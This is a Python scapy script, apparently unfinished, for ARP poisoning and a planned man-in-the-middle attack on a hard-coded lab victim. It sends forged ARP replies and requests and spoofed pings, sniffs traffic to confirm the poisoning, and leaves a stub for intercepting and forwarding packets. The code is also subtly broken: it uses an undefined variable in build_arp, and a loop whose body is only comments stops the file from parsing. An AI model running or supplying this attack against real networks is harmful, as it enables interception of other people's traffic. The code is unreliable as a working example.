from scapy.all import *
import time

import threading
lock = threading.Lock()

ARP_STORM_DELAY = 10          # milliseconds
ARP_POISON_SMART = 0          # boolean
ARP_POISON_WARM_UP = 1        # seconds
ARP_POISON_DELAY = 10         # seconds
ARP_POISON_ICMP = 1           # boolean
ARP_POISON_REPLY = 1          # boolean
ARP_POISON_REQUEST = 0        # boolean
ARP_POISON_EQUAL_MAC = 1      # boolean
DHCP_LEASE_TIME = 1800        # seconds
PORT_STEAL_DELAY = 10         # seconds
PORT_STEAL_SEND_DELAY = 2000  # microseconds

ATTACKER_MAC = get_if_hwaddr(conf.iface)
ATTACKER_IP = get_if_addr(conf.iface)

poison_thread = 0
poison_confirm_thread = 0
read_packets_thread = 0



macVictim = "08:00:27:b7:c4:af"
ipVictim = "192.168.56.101"

ipToSpoof = "192.168.56.102"

# arp = Ether() / ARP()
# arp[Ether].src = ATTACKER_MAC
# arp[ARP].hwsrc = ATTACKER_MAC
# arp[ARP].psrc = ipToSpoof
# arp[ARP].hwdst = macVictim
# arp[ARP].pdst = ipVictim

# sendp(arp, iface="enp0s3")

def build_ether(attacker_mac):
    ether = Ether()
    ether.src = attacker_mac
    return ether

def build_icmp_echo():
    icmp = ICMP()
    return icmp

def build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
    arp = ARP()
    arp.hwsrc = attacker_mac
    arp.psrc = victim_src_ip
    arp.hwdst = victim_dst_mac
    arp.pdst = victim_dst_ip
    arp.op = mode # 1 for request, 2 for reply
    return arp

def forge_l2_ping(victim_src_ip, victim_dst_ip, victim_dst_mac):
    # ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
    ping = IP(src=victim_src_ip, dst=victim_dst_ip)/ICMP()
    return ping

def forge_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
    # arp = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
    arp = build_ether(attacker_mac)/build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode)
    return arp

def arp_poison():
 while True:
    
    print("[*] Sending ARP poison packets...")
    
    icmp = forge_l2_ping(ipToSpoof, ipVictim, macVictim)
    sendp(icmp)

    arp = forge_arp(ipToSpoof, ipVictim, macVictim, ATTACKER_MAC, 2)
    sendp(arp) # iface="enp0s3"

    arp[ARP].op = 1
    sendp(arp) # iface="enp0s3"

    print("[*] end of ARP storm...")

    time.sleep(ARP_POISON_WARM_UP)
        

def poison_confirm():
    while True:
        pkt = sniff(filter="icmp", count=1)
        with lock:
            print("[*] Received ARP packet:")
            pkt.show()
            print()

def read_packets():
    while True:
        pkt = sniff(count=1)

        # check if packet is for victim

        # read packets / add packets to file

        # send packets to victim


def main():
    #use daemon=True to run in background and stop when application quits
    poison_thread =  threading.Thread(target=arp_poison).start()
    poison_confirm_thread = threading.Thread(target=poison_confirm).start()
    read_packets_thread = threading.Thread(target=read_packets).start()

    # wait for ctrl+c to exit application
    try: 
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0)

if __name__ == "__main__":
    main()
    print("Done")
    
